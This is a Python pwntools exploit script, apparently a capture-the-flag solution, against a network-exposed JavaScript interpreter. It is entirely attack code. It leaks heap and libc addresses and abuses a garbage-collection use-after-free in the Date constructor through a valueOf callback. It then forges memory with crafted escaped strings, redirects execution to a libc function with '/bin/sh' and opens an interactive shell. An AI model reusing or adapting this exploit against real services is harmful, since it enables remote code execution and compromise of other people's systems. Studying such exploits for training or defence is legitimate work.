from pwn import *
from ctypes import *
def todouble(s):
  cp = pointer(c_int(s))           # make this into a c integer
  fp = cast(cp, POINTER(c_double))  # cast the int pointer to a float pointer
  return fp.contents.value         # dereference the pointer, get the float
HOST = ""
PORT = 1234
REMOTE = 0
context.log_level = 'debug'
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def inter(dat):
  s.recvuntil('>')
  s.sendline(dat)
def dep(k):
  return "\\x" +k.encode("hex")
def depq(k):
  dat = ""
  for c in k:
    dat += dep(c)
  return dat
raw_input()
#leak
inter("var x = 'x'")
inter("var leak = {}")
inter("leak[''+x] = 1")
inter("leak")
heap = u64(s.recvuntil(':')[-7:-1]+"\x00\x00") - 0x40c78
print "HEAP :",hex(heap)
inter("gc()")
inter("var k = [];")
inter("var s;")
#loop = "for(var i = 0; i<0x3; i++){k={}};k.x= new String('%s');k.x = k.x+'%s';k.y={}"%('A'*0x40,'B'*0x20)
loop = ''
offset = 0x1f928
dat = "var s = {valueOf:function(){ gc(1); %s;return %s}}"%(loop,str(todouble(0x0)))
inter(dat)
dat = "var d = new Date(s)"
inter(dat)
dat = dep('\x41')*0x10
inter("var k = '%s';var k1 = '%s'"%(dep('\x41')*0x10,dep('\x41')*0x10))
inter("k += '%s'"%(dep('\x41')*0x10))
inter("k += '%s'"%(dep('\x42')*0x8+depq(p64(heap+0x42ce8))))
inter("k += '%s'"%(dep('\x42')*0x20))
dat = p64(heap+offset)+p64(heap+0x41c28)+p64(heap+0x43f38)
dat += "A"*0x20
dat = depq(dat)
inter("'%s'"%dat)
inter("d")
libc = u64(s.recvuntil(':')[-7:-1]+"\x00\x00") - 0x3c4b78
print "LIBC :",hex(libc)
dat = p64(heap+0x40a08)+p64(heap+0xc640)+p64(heap+0xc640)
dat += p32(0x00)+ p32(0x1)+p64(heap+0x43f38)+"\x00"*7+"\x07"+p64(0x1b)+p64(0x0)
dat = depq(dat)
inter("'%s'"%dat)
inter("'pwn'")
#dat = "A"*24
dat = p64(libc+0x45390)*3
dat += p64(libc+0x6ed80)
#dat += "A"*60
dat += "A"*4
dat += p64(0x41)*7
dat += p32(0xd)
dat = depq(dat)
inter("'%s'"%(dat))
inter("d.pwn.pwn='1'")
s.sendline("/bin/sh;\x00")
inter("d.pwn.hasOwnProperty('prop');")

s.interactive()
